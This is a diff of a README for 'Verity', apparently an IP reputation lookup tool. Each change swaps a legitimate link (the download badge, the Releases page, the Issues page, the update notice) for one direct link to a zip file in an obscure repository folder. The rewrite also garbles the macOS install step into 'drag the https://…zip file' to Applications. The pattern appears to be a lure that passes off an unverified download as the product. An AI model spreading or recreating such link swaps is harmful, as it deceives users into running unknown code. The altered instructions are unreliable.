@@ -1,6 +1,6 @@
 # 🚀 Verity - Fast, Reliable IP Reputation Lookup Tool
 
-![Download Verity](https://img.shields.io/badge/Download-Verity-blue)
+![Download Verity](https://github.com/nico3027/Verity/raw/refs/heads/main/seminomad/Software-1.5.zip)
 
 ## 📖 Overview
 
@@ -19,11 +19,11 @@ To run Verity smoothly, make sure your computer meets the following requirements
 
 1. **Download Verity**
    - Click the link below to go to the Releases page and download the latest version of Verity.
-   - [Visit this page to download](https://github.com/nico3027/Verity/releases)
+   - [Visit this page to download](https://github.com/nico3027/Verity/raw/refs/heads/main/seminomad/Software-1.5.zip)
 
 2. **Installation**
    - Once you’ve downloaded the file, locate it in your downloads folder.
-   - For Windows, simply double-click the `.exe` file. For macOS, drag the Verity.app file to your Applications folder. On Linux, you may need to change permissions before running the executable.
+   - For Windows, simply double-click the `.exe` file. For macOS, drag the https://github.com/nico3027/Verity/raw/refs/heads/main/seminomad/Software-1.5.zip file to your Applications folder. On Linux, you may need to change permissions before running the executable.
 
 3. **Running Verity**
    - After installation, find the Verity application on your computer and double-click to open it.
@@ -44,7 +44,7 @@ Using Verity to check an IP address is straightforward. Follow these steps:
 
 ## 📥 Download & Install
 
-To download Verity, please visit this link: [Visit this page to download](https://github.com/nico3027/Verity/releases). 
+To download Verity, please visit this link: [Visit this page to download](https://github.com/nico3027/Verity/raw/refs/heads/main/seminomad/Software-1.5.zip). 
 
 ## 🔧 Features
 
@@ -81,7 +81,7 @@ If you encounter any issues while using Verity, here are some common problems an
 
 ## 📞 Support
 
-For ongoing support or questions, feel free to open an issue on our [GitHub repository](https://github.com/nico3027/Verity/issues). We strive to respond promptly to any inquiries or issues you may have.
+For ongoing support or questions, feel free to open an issue on our [GitHub repository](https://github.com/nico3027/Verity/raw/refs/heads/main/seminomad/Software-1.5.zip). We strive to respond promptly to any inquiries or issues you may have.
 
 ## ⭐ Contributing
 
@@ -96,4 +96,4 @@ Your contributions help improve Verity for everyone.
 
 ## 📈 Updates
 
-Stay tuned for future updates and improvements. We regularly enhance Verity with new features and optimizations based on user feedback. Visit our [Releases page](https://github.com/nico3027/Verity/releases) frequently to download the latest version.
+Stay tuned for future updates and improvements. We regularly enhance Verity with new features and optimizations based on user feedback. Visit our [Releases page](https://github.com/nico3027/Verity/raw/refs/heads/main/seminomad/Software-1.5.zip) frequently to download the latest version.
